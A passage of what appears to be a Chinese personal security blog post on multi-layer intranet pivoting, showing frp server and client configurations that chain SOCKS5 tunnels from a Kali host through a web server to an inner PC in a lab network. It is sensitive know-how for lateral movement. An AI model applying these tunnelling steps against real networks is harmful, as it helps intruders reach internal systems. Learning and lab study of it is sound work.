+<h5 id="3-5：结尾"><a href="#3-5：结尾" class="headerlink" title="3.5：结尾"></a>3.5：结尾</h5><p>​    注意当我们在node2节点开启socks 8888 的时候 web服务器并没有开启8888端口。也就是说他并不是kali开启8888端口，然后web开启8888端口，这样一条线连接到node2.具体是怎么样，我暂时没想明白，等这个学期学完socks编程可能就懂了</p>
+<h2 id="0X05：通过frp进行多级代理"><a href="#0X05：通过frp进行多级代理" class="headerlink" title="0X05：通过frp进行多级代理"></a>0X05：通过frp进行多级代理</h2><h4 id="1、frp原理"><a href="#1、frp原理" class="headerlink" title="1、frp原理"></a>1、frp原理</h4><p>​    服务端运行，监听一个主端口，等待客户端的连接（在frps.ini里面配置主端口）；- 客户端连接到服务端的主端口，同时告诉服务端要监听的端口和转发类型(在frpc.ini设置)；- 服务端创建新的进程监听客户端指定的端口；我们通过代理手段，将流量发到客户端指定的端口，服务端通过和客户端的连接将数据转发到客户端；这样就实现了内网的访问</p>
+<p>​    frp实现多级代理的时候就像焊接管道一样</p>
+<p>​    frp还可以进行nat穿透，用来将内网的服务暴露在公网上。</p>
+<p>​    frp下载地址：<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp/releases/tag/v0.44.0">Release v0.44.0 · fatedier/frp · GitHub</a>有各个版本的</p>
+<h4 id="2、frp的配置文件"><a href="#2、frp的配置文件" class="headerlink" title="2、frp的配置文件"></a>2、frp的配置文件</h4><p><strong>2.1首先是frps和frps.ini</strong></p>
+<p>​    frps只能用于linux上。frps.ini配置文件如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7001</span><br><span class="line">这个端口就是主端口，开启服务端的用来给frpc客户端连接的</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>2.2其次是frpc和frpc.ini</strong></p>
+<p>​    frpc可以工作在linux和windows。frpc.ini</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.111.129   frps的ip</span><br><span class="line">server_port = 7001              frps的主端口</span><br><span class="line"></span><br><span class="line">[http_proxy]                    服务器的名字，可以ssh，frp但不能重复</span><br><span class="line">type = tcp					  数据转发类型</span><br><span class="line">local_ip = 192.168.10.130		frpc的地址，可以省</span><br><span class="line">local_port = 22					</span><br><span class="line">remote_port = 6000             这里会在frps服务端开启6000监听，并将6000端口流量转发到22端口</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="3、frp两层网络一级代理"><a href="#3、frp两层网络一级代理" class="headerlink" title="3、frp两层网络一级代理"></a>3、frp两层网络一级代理</h4><p> <strong>3.1 首先在kali运行frps：./frps -c frps.ini  （配置文件如下</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">							frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port = 7001</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221008012309043.png" class="" title="image-20221008012309043">
+
+<p><strong>3.2 在web服务器上运行frpc：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">frpc.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.111.129</span><br><span class="line">server_port = 7001</span><br><span class="line"></span><br><span class="line">[http_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 1080</span><br><span class="line">plugin = socks5       启用socks代理，这里不用指定本地端口，因为不需要进行端口转发，这里会直接将1080流量转发到frpc</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221008014606910.png" class="" title="image-20221008014606910">
+
+
+
+<p>然后修改proxychain的配置文件就可以了。和上面两个一样的操作</p>
+<h4 id="4、frp的三层网络二级代理"><a href="#4、frp的三层网络二级代理" class="headerlink" title="4、frp的三层网络二级代理"></a>4、frp的三层网络二级代理</h4><p><strong>4.1 原理</strong></p>
+<p>​    pc(127.10.10.201)不能直接连接kali，可以连接内网web服务器，内网web服务器可以直接连接kali，所以通过内网web服务器作为跳板，进行二级代理。首先在内网的web服务器与pc之间建立一条frps隧道，内网web服务器启动frps，pc启动frpc服务，相互连接，建立起一条一级代理隧道，此时web服务器就作为跳板了。然后在kali上启动frps服务，再在web服务器上打开frpc服务，这样kali和web服务器隧道建立，此时二级代理完成，可直接访问到pc</p>
+<p>4.2 首先web和pc建立一级代理</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">web服务器运行：frps.exe -c frps.ini</span><br><span class="line"></span><br><span class="line">frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line"></span><br><span class="line">pc机：frpc.exe -c frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = 176.10.10.201</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[http_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 6666</span><br><span class="line">plugin = socks5</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221008020959566.png" class="" title="image-20221008020959566">
+
+<img src="/2022/10/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20221008021010546.png" class="" title="image-20221008021010546">
+
+
+
+
+
+<p>4.3 在kali和web服务器进行端口转发，实现二级代理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">web 服务器:frpc.exe -c frpc.ini</span><br><span class="line"></span><br><span class="line">					frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.111.129</span><br><span class="line">server_port = 7001</span><br><span class="line"></span><br><span class="line">[http_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 10.10.10.201</span><br><span class="line">local_port = 6666</span><br><span class="line">remote_port = 7777</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kali：</span><br><span class="line">					frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port = 7001</span><br><span class="line"></span><br><span class="line">这样kali的7777端口的流量就被转发到web机的6666端口（通过二级代理），然后呢，web机的6666端口流量又通过socks代理发往到pc机（通过一级代理）</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="5、结尾"><a href="#5、结尾" class="headerlink" title="5、结尾"></a>5、结尾</h4><p>​    frps的三级代理和上面差不多，就跟焊管道一样，一个接一个连接起来就好了.</p>
+<p>​    frp一些拓展知识</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">frp的代理类型：</span><br><span class="line">	tcp：单纯的TCP端口映射，服务端会根据不同的端口路由到不同的内网服务。</span><br><span class="line">	udp：单纯的UDP端口映射，服务端会根据不用的端口路由到不用的内网服务。</span><br><span class="line">	http：针对HTTP应用定制了一些额外的功能，例如修改Host Header，增加鉴权。</span><br><span class="line">	https：针对HTTPS应用定制了一些额外的功能。</span><br><span class="line">	stcp：安全的TCP内网代理，需要在访问者和被访问者的机器上都部署frpc，不需要在服务	 端暴露端口。</span><br><span class="line">	sudp：安全的UDP内网代理，需要在被访问者和访问者的机器上都部署frpc，不需要在服务     端暴露端口。</span><br><span class="line">	xtcp：点对点内网穿透代理，功能同stcp，但是流量不需要经过服务器中转。</span><br><span class="line">	tcpmux：支持服务端TCP端口的多路复用，通过同一个端口访问不同的内网服务。</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0X06-末尾"><a href="#0X06-末尾" class="headerlink" title="0X06:末尾"></a>0X06:末尾</h2><p>​    本文章到这里就结束了，当然还有很多，如ssh，dns通道等等这些知识没写。通过写文章也能梳理一些知识点。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/06/02/fb3efce4ceac2f5445c7ae17e3e969ab/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-number">1.</span> <span class="nav-text">关于多层内网渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0X01-%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">0X01:前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X02%EF%BC%9A%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86"><span class="nav-number">1.2.</span> <span class="nav-text">0X02：关于内网的一些知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X03%EF%BC%9A%E9%80%9A%E8%BF%87msf-kali%E8%87%AA%E5%B8%A6%E7%9A%84proxychain%E6%90%AD%E5%BB%BAsock%E4%BB%A3%E7%90%86"><span class="nav-number">1.3.</span> <span class="nav-text">0X03：通过msf+kali自带的proxychain搭建sock代理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-number">1.3.1.</span> <span class="nav-text">1、环境配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E4%BA%8C%E5%B1%82%E7%BD%91%E7%BB%9C%E7%9A%84%E4%B8%80%E5%B1%82%E4%BB%A3%E7%90%86"><span class="nav-number">1.3.2.</span> <span class="nav-text">2、二层网络的一层代理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-%E4%BC%A0%E6%9C%A8%E9%A9%AC"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">2.1 传木马</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1%E7%AD%89%E7%AD%89"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">2.2添加路由等等</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-msf%E5%90%AF%E7%94%A8socks%E4%BB%A3%E7%90%86-proxychain"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">2.3 msf启用socks代理+proxychain</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BA%8C%E5%B1%82%E4%BB%A3%E7%90%86"><span class="nav-number">1.3.3.</span> <span class="nav-text">3.三层网络二层代理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1%E7%94%9F%E6%88%90%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E6%9C%A8%E9%A9%AC"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">3.1生成正向连接木马</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">3.2添加路由</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4%E3%80%81%E7%BB%93%E5%B0%BE"><span class="nav-number">1.3.4.</span> <span class="nav-text">4、结尾</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X04%EF%BC%9A%E9%80%9A%E8%BF%87venom%E8%BF%99%E4%B8%AA%E5%B0%8F%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8C%E5%A4%9A%E7%BA%A7%E4%BB%A3%E7%90%86"><span class="nav-number">1.4.</span> <span class="nav-text">0X04：通过venom这个小工具进行多级代理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81venom%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.4.0.1.</span> <span class="nav-text">1、venom介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81venom%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-number">1.4.0.2.</span> <span class="nav-text">2、venom的使用方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#2-2%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4"><span class="nav-number">1.4.0.2.1.</span> <span class="nav-text">2.2一些命令</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81venom%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BA%A7%E4%BB%A3%E7%90%86"><span class="nav-number">1.4.0.3.</span> <span class="nav-text">3、venom实现多级代理</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#3-1%EF%BC%9A%E4%BA%8C%E5%B1%82%E7%BD%91%E7%BB%9C%E7%9A%84%E4%B8%80%E5%B1%82%E4%BB%A3%E7%90%86"><span class="nav-number">1.4.0.3.1.</span> <span class="nav-text">3.1：二层网络的一层代理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-2%E5%90%AF%E7%94%A8socks%E4%BB%A3%E7%90%86"><span class="nav-number">1.4.0.3.2.</span> <span class="nav-text">3.2启用socks代理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-3-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E7%9A%84%E4%BA%8C%E5%B1%82%E4%BB%A3%E7%90%86"><span class="nav-number">1.4.0.3.3.</span> <span class="nav-text">3.3 三层网络的二层代理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-5%EF%BC%9A%E7%BB%93%E5%B0%BE"><span class="nav-number">1.4.0.3.4.</span> <span class="nav-text">3.5：结尾</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X05%EF%BC%9A%E9%80%9A%E8%BF%87frp%E8%BF%9B%E8%A1%8C%E5%A4%9A%E7%BA%A7%E4%BB%A3%E7%90%86"><span class="nav-number">1.5.</span> <span class="nav-text">0X05：通过frp进行多级代理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81frp%E5%8E%9F%E7%90%86"><span class="nav-number">1.5.0.1.</span> <span class="nav-text">1、frp原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81frp%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-number">1.5.0.2.</span> <span class="nav-text">2、frp的配置文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81frp%E4%B8%A4%E5%B1%82%E7%BD%91%E7%BB%9C%E4%B8%80%E7%BA%A7%E4%BB%A3%E7%90%86"><span class="nav-number">1.5.0.3.</span> <span class="nav-text">3、frp两层网络一级代理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4%E3%80%81frp%E7%9A%84%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BA%8C%E7%BA%A7%E4%BB%A3%E7%90%86"><span class="nav-number">1.5.0.4.</span> <span class="nav-text">4、frp的三层网络二级代理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5%E3%80%81%E7%BB%93%E5%B0%BE"><span class="nav-number">1.5.0.5.</span> <span class="nav-text">5、结尾</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X06-%E6%9C%AB%E5%B0%BE"><span class="nav-number">1.6.</span> <span class="nav-text">0X06:末尾</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
